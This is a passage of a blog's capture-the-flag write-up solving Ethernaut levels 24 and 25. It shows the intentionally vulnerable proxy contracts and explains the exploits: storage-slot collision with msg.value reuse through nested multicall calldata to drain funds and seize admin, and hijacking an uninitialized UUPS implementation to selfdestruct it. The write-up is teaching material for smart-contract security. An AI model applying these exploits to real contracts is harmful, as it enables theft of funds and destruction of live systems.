+<span class="ln">60</span>        <span class="n">whitelisted</span><span class="p">[</span><span class="n">addr</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">61</span>    <span class="p">}</span>
+<span class="ln">62</span>
+<span class="ln">63</span>    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="n">onlyWhitelisted</span> <span class="p">{</span>
+<span class="ln">64</span>      <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&lt;=</span> <span class="n">maxBalance</span><span class="p">,</span> <span class="s">&#34;Max balance reached&#34;</span><span class="p">);</span>
+<span class="ln">65</span>      <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">add</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+<span class="ln">66</span>    <span class="p">}</span>
+<span class="ln">67</span>
+<span class="ln">68</span>    <span class="kd">function</span> <span class="nf">execute</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="n">onlyWhitelisted</span> <span class="p">{</span>
+<span class="ln">69</span>        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nb">value</span><span class="p">,</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+<span class="ln">70</span>        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">sub</span><span class="p">(</span><span class="nb">value</span><span class="p">);</span>
+<span class="ln">71</span>        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">to</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span> <span class="nb">value</span><span class="o">:</span> <span class="nb">value</span> <span class="p">}(</span><span class="nb">data</span><span class="p">);</span>
+<span class="ln">72</span>        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Execution failed&#34;</span><span class="p">);</span>
+<span class="ln">73</span>    <span class="p">}</span>
+<span class="ln">74</span>
+<span class="ln">75</span>    <span class="kd">function</span> <span class="nf">multicall</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="n">onlyWhitelisted</span> <span class="p">{</span>
+<span class="ln">76</span>        <span class="kt">bool</span> <span class="n">depositCalled</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="ln">77</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">data</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">78</span>            <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_data</span> <span class="o">=</span> <span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="ln">79</span>            <span class="kt">bytes4</span> <span class="nb">selector</span><span class="p">;</span>
+<span class="ln">80</span>            <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln">81</span>                <span class="n">selector</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">_data</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
+<span class="ln">82</span>            <span class="p">}</span>
+<span class="ln">83</span>            <span class="n">if</span> <span class="p">(</span><span class="n">selector</span> <span class="err">==</span> <span class="n">this</span><span class="err">.</span><span class="n">deposit</span><span class="err">.</span><span class="n">selector</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">84</span>                <span class="n">require</span><span class="p">(</span><span class="err">!</span><span class="n">depositCalled</span><span class="p">,</span> <span class="s">&#34;Deposit can only be called once&#34;</span><span class="p">)</span><span class="err">;</span>
+<span class="ln">85</span>                <span class="c1">// Protect against reusing msg.value
+</span><span class="ln">86</span><span class="c1"></span>                <span class="n">depositCalled</span> <span class="err">=</span> <span class="n">true</span><span class="err">;</span>
+<span class="ln">87</span>            <span class="p">}</span>
+<span class="ln">88</span>            <span class="p">(</span><span class="n">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="err">=</span> <span class="nf">address</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="err">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="n">data</span><span class="err">[</span><span class="n">i</span><span class="err">]</span><span class="p">)</span><span class="err">;</span>
+<span class="ln">89</span>            <span class="n">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Error while delegating call&#34;</span><span class="p">)</span><span class="err">;</span>
+<span class="ln">90</span>        <span class="p">}</span>
+<span class="ln">91</span>    <span class="p">}</span>
+<span class="ln">92</span><span class="p">}</span>
+</code></pre></div><p>The <code>multicall(bytes[])</code> function has a flag preventing it to call <code>deposit()</code> more than once, otherwise there would be duplicate deposits with the same <code>msg.value</code>.</p>
+<h3 id="vulnerability--attack-vector-3">Vulnerability / Attack vector</h3>
+<p>There are two vulnerabilities that need to be exploited to become administrator of the proxy:</p>
+<ul>
+<li>Storage slots overwritten between the proxy and the implementation</li>
+<li>Bad implementation allowing <code>msg.value</code> reuse in <code>multicall(bytes[])</code></li>
+</ul>
+<h3 id="solution-3">Solution</h3>
+<p>First thing to notice, is that the storage is vulnerable to an overwritting of variables. The layout of the first two slots is:</p>
+<ul>
+<li>Slot 0: <code>address pendingAdmin</code> from <code>PuzzleProxy</code>, and <code>address owner</code> from <code>PuzzleWallet</code>.</li>
+<li>Slot 1: <code>address admin</code> from <code>PuzzleProxy</code>, and <code>uint256 maxBalance</code> from <code>PuzzleWallet</code>.</li>
+</ul>
+<p>So, overwriting one of the variables that point to one of those slots, the other one would be modified. This is the way to become owner of <code>PuzzleWallet</code>. Calling <code>proposeNewAdmin(address)</code> with the player address as argument, makes the player the new owner of the wallet. Note that this is an external function with no modifiers, so anyone can call it.</p>
+<p>Now we have to overwrite <code>uint256 maxBalance</code> in <code>PuzzleWallet</code> to become admin of the proxy. This is not as straightforward as the previous task, as it requires some intermediate steps to complete.</p>
+<p>First step, as the owner of the wallet, add the player's address to the whitelist calling <code>addToWhitelist(address)</code>.</p>
+<p>Now, the plan is to call <code>setMaxBalance(uint256)</code> to overwrite the proxy's administrator address. The problem is that the function requires the contract's balance (that is, the wallet's balance) to be 0. When the contract was deployed, it was funded with 1 ether, so the next task would be to get that ether out.</p>
+<p>The only function that implements an ether transfer is <code>execute(address, uint256, bytes)</code>. However, the wallet has an internal accounting implemented in the mapping <code>balances</code>. So far, the player's internal balance is 0, so there's no way to execute this function. If the player calls <code>deposit()</code> to increment his own balance, the <code>msg.value</code> sent will be added to the balance, but the internal accounting would still be 1 ether behind the real wallet balance. We need to find a way to trick the internal balance to match the contract's balance.</p>
+<p>This trick is to call <code>multicall(bytes[])</code> with an argument array such that it:</p>
+<ul>
+<li>Calls <code>deposit()</code> with the <code>msg.value</code> sent.</li>
+<li>Calls itself with the data to call <code>deposit()</code> again, in what we could define as a recursive call of sorts. This can be repeated any amount of times, as needed.</li>
+</ul>
+<p>To pass these calls as <code>bytes[]</code> argument, we need to abi-encode them. According to <a href="https://docs.soliditylang.org/en/develop/abi-spec.html">Solidity's contract ABI specification</a>, the encoded calls are:</p>
+<ul>
+<li>Call to <code>deposit()</code>: <code>0xd0e30db0</code>, as there are no arguments, we only need the function selector.</li>
+<li>Call to <code>multicall(bytes[])</code> with the previous call as argument: <code>0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000</code></li>
+</ul>
+<p>This scenario bypasses the <code>depositCalled</code> flag, because it is local to the current call. The <code>msg.value</code> can then be reused for both deposits, increasing the player's internal balance in a greater amount than the contract's balance. The goal here is to choose a <code>msg.value</code> and repeating the <em>recursive call</em> an amount of times such that the player's internal balance ends up being higher or equal to the contract's balance.</p>
+<p>Remembering that the initial contract's balance is <code>1 ether</code> and the player's balance is 0, the simplest approach would be setting <code>msg.value</code> to <code>1 ether</code> and calling the function once. The final result is both balances equal to <code>2 ether</code>. However, if you don't have that much ether to spare, you can send <code>0.1 ether</code> and call the function 10 times.</p>
+<p>Now that both balances are at least equal, it's possible to call <code>execute(address, uint256, bytes)</code> to recover the ethers and empty the contract's balance. This will allow the player to finally call <code>setMaxBalance(uint256)</code> with his EOA as argument, effectively becoming the admin of the proxy.</p>
+<h3 id="conclusions-3">Conclusions</h3>
+<p>Before implementing a pattern such as Proxy, read the documentation thorougly in order to avoid falling in these implementation problems.</p>
+<p>Also, all delegatecalls should be considered risky, moreso if they are inside a loop, with the target passed as argument and with the possibility of reusing <code>msg.value</code>. Never trust user input, ever.</p>
+<hr>
+<h2 id="level-25-motorbike">Level 25: Motorbike</h2>
+<hr>
+<p>Here's an implementation of a motorbike whose design implements an upgradable engine. The creators decided to implement the <a href="https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786">UUPS upgradeable pattern</a> and the goal is to somehow destroy the implemented engine.</p>
+<h3 id="contract-analysis-4">Contract analysis</h3>
+<p>Two contracts in this level, the first one implements the <code>Motorbike</code> and acts as a proxy, forwarding all calls to the second contract, the <code>Engine</code> implementation.</p>
+<p>In the <code>Motorbike</code> contract there are no public or external functions except for the <code>fallback()</code>. This instance only serves as storage and call delegator. All the calls are forwarded to the address stored in slot <code>keccak(&quot;eip1967.proxy.implementation&quot;) - 1</code>, also referred to as <code>_IMPLEMENTATION_SLOT</code>. Upon deployment, this slot gets initialized to the designated <code>Engine</code> instance.</p>
+<p>The <code>Engine</code> contract inherits from <code>Initializable</code>, which simplifies the initialization of storage upon a new instance deployment. Basically, you can't use a constructor to initialize its storage, because the storage it uses is not its own but <code>Motorbike</code>'s. The <code>initializer</code> modifier makes sure that the functions marked with it can only be called once.</p>
+<p>The only publicly callable functions in <code>Engine</code> are <code>initialize()</code> that isn't really callable because the contract is already initialized, and <code>upgradeToAndCall(address, bytes)</code> that allows the upgrader address to upgrade the implementation to a new address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln">  1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln">  2</span><span class="c1"></span>
+<span class="ln">  3</span><span class="k">pragma solidity</span> <span class="o">&lt;</span><span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln">  4</span>
+<span class="ln">  5</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span><span class="p">;</span>
+<span class="ln">  6</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/proxy/Initializable.sol&#34;</span><span class="p">;</span>
+<span class="ln">  7</span>
+<span class="ln">  8</span><span class="kd">contract</span> <span class="nc">Motorbike</span> <span class="p">{</span>
+<span class="ln">  9</span>    <span class="c1">// keccak-256 hash of &#34;eip1967.proxy.implementation&#34; subtracted by 1
+</span><span class="ln"> 10</span><span class="c1"></span>    <span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
+<span class="ln"> 11</span>    
+<span class="ln"> 12</span>    <span class="kd">struct</span> <span class="nc">AddressSlot</span> <span class="p">{</span>
+<span class="ln"> 13</span>        <span class="kt">address</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln"> 14</span>    <span class="p">}</span>
+<span class="ln"> 15</span>    
+<span class="ln"> 16</span>    <span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+</span><span class="ln"> 17</span><span class="c1"></span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_logic</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 18</span>        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">_logic</span><span class="p">),</span> <span class="s">&#34;ERC1967: new implementation is not a contract&#34;</span><span class="p">);</span>
+<span class="ln"> 19</span>        <span class="n">_getAddressSlot</span><span class="p">(</span><span class="n">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nb">value</span> <span class="o">=</span> <span class="n">_logic</span><span class="p">;</span>
+<span class="ln"> 20</span>        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">_logic</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span>
+<span class="ln"> 21</span>            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;initialize()&#34;</span><span class="p">)</span>
+<span class="ln"> 22</span>        <span class="p">);</span>
+<span class="ln"> 23</span>        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Call failed&#34;</span><span class="p">);</span>
+<span class="ln"> 24</span>    <span class="p">}</span>
+<span class="ln"> 25</span>
+<span class="ln"> 26</span>    <span class="c1">// Delegates the current call to `implementation`.
+</span><span class="ln"> 27</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">_delegate</span><span class="p">(</span><span class="kt">address</span> <span class="n">implementation</span><span class="p">)</span> <span class="k">internal</span> <span class="k">virtual</span> <span class="p">{</span>
+<span class="ln"> 28</span>        <span class="c1">// solhint-disable-next-line no-inline-assembly
+</span><span class="ln"> 29</span><span class="c1"></span>        <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln"> 30</span>            <span class="nf">calldatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">calldatasize</span><span class="p">())</span>
+<span class="ln"> 31</span>            <span class="ow">let</span> <span class="nv">result</span> <span class="o">:=</span> <span class="nf">delegatecall</span><span class="p">(</span><span class="nf">gas</span><span class="p">(),</span> <span class="n">implementation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">calldatasize</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="ln"> 32</span>            <span class="nf">returndatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span>
+<span class="ln"> 33</span>            <span class="nf">switch</span> <span class="n">result</span>
+<span class="ln"> 34</span>            <span class="n">case</span> <span class="mi">0</span> <span class="p">{</span> <span class="nf">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span> <span class="p">}</span>
+<span class="ln"> 35</span>            <span class="n">default</span> <span class="p">{</span> <span class="nf">return</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span> <span class="p">}</span>
+<span class="ln"> 36</span>        <span class="p">}</span>
+<span class="ln"> 37</span>    <span class="p">}</span>
+<span class="ln"> 38</span>
+<span class="ln"> 39</span>    <span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`. 
+</span><span class="ln"> 40</span><span class="c1"></span>    <span class="c1">// Will run if no other function in the contract matches the call data
+</span><span class="ln"> 41</span><span class="c1"></span>    <span class="n">fallback</span> <span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">virtual</span> <span class="p">{</span>
+<span class="ln"> 42</span>        <span class="n">_delegate</span><span class="p">(</span><span class="n">_getAddressSlot</span><span class="p">(</span><span class="n">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nb">value</span><span class="p">);</span>
+<span class="ln"> 43</span>    <span class="p">}</span>
+<span class="ln"> 44</span>    
+<span class="ln"> 45</span>    <span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.
+</span><span class="ln"> 46</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">_getAddressSlot</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">slot</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="n">AddressSlot</span> <span class="k">storage</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln"> 47</span>        <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln"> 48</span>            <span class="n">r_slot</span> <span class="o">:=</span> <span class="n">slot</span>
+<span class="ln"> 49</span>        <span class="p">}</span>
+<span class="ln"> 50</span>    <span class="p">}</span>
+<span class="ln"> 51</span><span class="p">}</span>
+<span class="ln"> 52</span>
+<span class="ln"> 53</span><span class="kd">contract</span> <span class="nc">Engine</span> <span class="k">is</span> <span class="n">Initializable</span> <span class="p">{</span>
+<span class="ln"> 54</span>    <span class="c1">// keccak-256 hash of &#34;eip1967.proxy.implementation&#34; subtracted by 1
+</span><span class="ln"> 55</span><span class="c1"></span>    <span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
+<span class="ln"> 56</span>
+<span class="ln"> 57</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">upgrader</span><span class="p">;</span>
+<span class="ln"> 58</span>    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">horsePower</span><span class="p">;</span>
+<span class="ln"> 59</span>
+<span class="ln"> 60</span>    <span class="kd">struct</span> <span class="nc">AddressSlot</span> <span class="p">{</span>
+<span class="ln"> 61</span>        <span class="kt">address</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln"> 62</span>    <span class="p">}</span>
+<span class="ln"> 63</span>
+<span class="ln"> 64</span>    <span class="kd">function</span> <span class="nf">initialize</span><span class="p">()</span> <span class="k">external</span> <span class="n">initializer</span> <span class="p">{</span>
+<span class="ln"> 65</span>        <span class="n">horsePower</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>
+<span class="ln"> 66</span>        <span class="n">upgrader</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+<span class="ln"> 67</span>    <span class="p">}</span>
+<span class="ln"> 68</span>
+<span class="ln"> 69</span>    <span class="c1">// Upgrade the implementation of the proxy to `newImplementation`
+</span><span class="ln"> 70</span><span class="c1"></span>    <span class="c1">// subsequently execute the function call
+</span><span class="ln"> 71</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">data</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+<span class="ln"> 72</span>        <span class="n">_authorizeUpgrade</span><span class="p">();</span>
+<span class="ln"> 73</span>        <span class="n">_upgradeToAndCall</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">,</span> <span class="nb">data</span><span class="p">);</span>
+<span class="ln"> 74</span>    <span class="p">}</span>
+<span class="ln"> 75</span>
+<span class="ln"> 76</span>    <span class="c1">// Restrict to upgrader role
+</span><span class="ln"> 77</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">_authorizeUpgrade</span><span class="p">()</span> <span class="k">internal</span> <span class="k">view</span> <span class="p">{</span>
+<span class="ln"> 78</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">upgrader</span><span class="p">,</span> <span class="s">&#34;Can&#39;t upgrade&#34;</span><span class="p">);</span>
+<span class="ln"> 79</span>    <span class="p">}</span>
+<span class="ln"> 80</span>
+<span class="ln"> 81</span>    <span class="c1">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+</span><span class="ln"> 82</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">_upgradeToAndCall</span><span class="p">(</span>
+<span class="ln"> 83</span>        <span class="kt">address</span> <span class="n">newImplementation</span><span class="p">,</span>
+<span class="ln"> 84</span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">data</span>
+<span class="ln"> 85</span>    <span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
+<span class="ln"> 86</span>        <span class="c1">// Initial upgrade and setup call
+</span><span class="ln"> 87</span><span class="c1"></span>        <span class="n">_setImplementation</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">);</span>
+<span class="ln"> 88</span>        <span class="k">if</span> <span class="p">(</span><span class="nb">data</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln"> 89</span>            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">newImplementation</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">data</span><span class="p">);</span>
+<span class="ln"> 90</span>            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Call failed&#34;</span><span class="p">);</span>
+<span class="ln"> 91</span>        <span class="p">}</span>
+<span class="ln"> 92</span>    <span class="p">}</span>
+<span class="ln"> 93</span>    
+<span class="ln"> 94</span>    <span class="c1">// Stores a new address in the EIP1967 implementation slot.
+</span><span class="ln"> 95</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">_setImplementation</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
+<span class="ln"> 96</span>        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">),</span> <span class="s">&#34;ERC1967: new implementation is not a contract&#34;</span><span class="p">);</span>
+<span class="ln"> 97</span>        
+<span class="ln"> 98</span>        <span class="n">AddressSlot</span> <span class="k">storage</span> <span class="n">r</span><span class="p">;</span>
+<span class="ln"> 99</span>        <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln">100</span>            <span class="n">r_slot</span> <span class="o">:=</span> <span class="n">_IMPLEMENTATION_SLOT</span>
+<span class="ln">101</span>        <span class="p">}</span>
+<span class="ln">102</span>        <span class="n">r</span><span class="err">.</span><span class="n">value</span> <span class="err">=</span> <span class="n">newImplementation</span><span class="err">;</span>
+<span class="ln">103</span>    <span class="p">}</span>
+<span class="ln">104</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector-4">Vulnerability / Attack vector</h3>
+<p>Since the <code>Engine</code> contract has no constructor, its own storage is not initialized.</p>
+<h3 id="solution-4">Solution</h3>
+<p>This vulnerability can be used to become the updater of the deployed instance, and make it delegatecall a <code>selfdestruct()</code> function.</p>
+<p>As said earlier, the <code>Motorbike</code> proxy allows to delegatecall the <code>Engine</code> functions, therefore using its storage. However, if the attacker calls the function on the deployed instance of <code>Engine</code>, the storage used will be its own, and not <code>Motorbike</code>'s.</p>
+<p>The goal of the level was to <code>selfdestruct()</code> the <code>Engine</code> instance. So, the first step is to find its address by either reading the <code>Motorbike</code> instance's <code>_IMPLEMENTATION_SLOT</code> storage slot, or by checking Etherscan for the address of <code>Motorbike</code> and then checking its internal transactions. Once the address is known, the next step is to interact with it and become the upgrader by calling <code>initialize()</code>. Remember that the storage modified now is <code>Engine</code>'s and not <code>Motorbike</code>'s, because we're not delegating the calls.</p>
+<p>Next, to destroy the instance, the <code>upgradeToAndCall(address, bytes)</code> function trusts the address passed as argument enough to allow a delegatecall to whatever function we choose. So, the following contract was deployed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln">1</span><span class="kd">contract</span> <span class="nc">EngineKiller</span> <span class="p">{</span>
+<span class="ln">2</span>    <span class="kd">function</span> <span class="nf">kill</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">3</span>        <span class="nb">selfdestruct</span><span class="p">(</span><span class="mh">0x0000000000000000000000000000000000000000</span><span class="p">);</span>
+<span class="ln">4</span>    <span class="p">}</span>
+<span class="ln">5</span><span class="p">}</span>
+</code></pre></div><p>By calling <code>upgradeToAndCall(&lt;EngineKiller's deployed instance&gt;, 0x41c0e1b5)</code> we instruct the <code>Engine</code> to destroy itself, therefore solving the level. Note that <code>0x41c0e1b5</code> is the function selector for <code>kill()</code>.</p>
+<h3 id="conclusions-4">Conclusions</h3>
+<p>For security, both the proxy and implementation storages must be initialized to the same values, in order to prevent this attack. The <a href="https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680">article by Santiago Palladino</a> linked in the level text after completion is a great read.</p>
+    </div>
+
+	<h2 class="post_related">Posts in this Series</h2>
+	<ul>
+	  
+	</ul>
+
+<div class="post_comments">
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "tqts" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  
+</div>
+
+
+
+  </article>
+<aside class="sidebar">
+  <section class="sidebar_inner">
+        <h2>tqts</h2>
+      <div class="author_bio">
+        Engineer, maker, hobbyist.
+      </div>
+      <a href='https://tqts.ar/about/' class="button mt-1" role="button" title='Read More'>Read More</a>
+    
+      
+	    <h2 class="mt-4">Posts in this series</h2>
+      <ul>
+        
+      </ul>
+    
+    <h2 class="mt-4">Recent Posts</h2>
+    <ul class="flex-column">
+      <li>
+        <a href="https://tqts.ar/post/ethernaut-4/" class="nav-link" title="Solving Ethernaut - Part 4 - Levels 16 to 20">Solving Ethernaut - Part 4 - Levels 16 to 20</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/ethernaut-3/" class="nav-link" title="Solving Ethernaut - Part 3 - Levels 11 to 15">Solving Ethernaut - Part 3 - Levels 11 to 15</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/ethernaut-2/" class="nav-link" title="Solving Ethernaut - Part 2 - Levels 6 to 10">Solving Ethernaut - Part 2 - Levels 6 to 10</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/ethernaut-1/" class="nav-link" title="Solving Ethernaut - Part 1 - Levels 0 to 5">Solving Ethernaut - Part 1 - Levels 0 to 5</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-5/" class="nav-link" title="Solving CaptureTheEther - Part 5 of 5 - Miscellaneous">Solving CaptureTheEther - Part 5 of 5 - Miscellaneous</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-4/" class="nav-link" title="Solving CaptureTheEther - Part 4 of 5 - Accounts">Solving CaptureTheEther - Part 4 of 5 - Accounts</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-3/" class="nav-link" title="Solving CaptureTheEther - Part 3 of 5 - Math">Solving CaptureTheEther - Part 3 of 5 - Math</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-2/" class="nav-link" title="Solving CaptureTheEther - Part 2 of 5 - Lotteries">Solving CaptureTheEther - Part 2 of 5 - Lotteries</a>
+      </li>
+    </ul>
+    <div>
+      <h2 class="mt-4 taxonomy" id="categories-section">Categories</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/categories/ctf-writeups/' class="post_tag button button_translucent" title="ctf-writeups">
+          CTF-WRITEUPS
+          <span class="button_tally">10</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+    <div>
+      <h2 class="mt-4 taxonomy" id="series-section">Series</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/series/capturetheether/' class="post_tag button button_translucent" title="capturetheether">
+          CAPTURETHEETHER
+          <span class="button_tally">5</span>
+        </a>
+        
+        <a href='https://tqts.ar/series/ethernaut/' class="post_tag button button_translucent" title="ethernaut">
+          ETHERNAUT
+          <span class="button_tally">5</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+    <div>
+      <h2 class="mt-4 taxonomy" id="tags-section">Tags</h2>
+      <nav class="tags_nav">
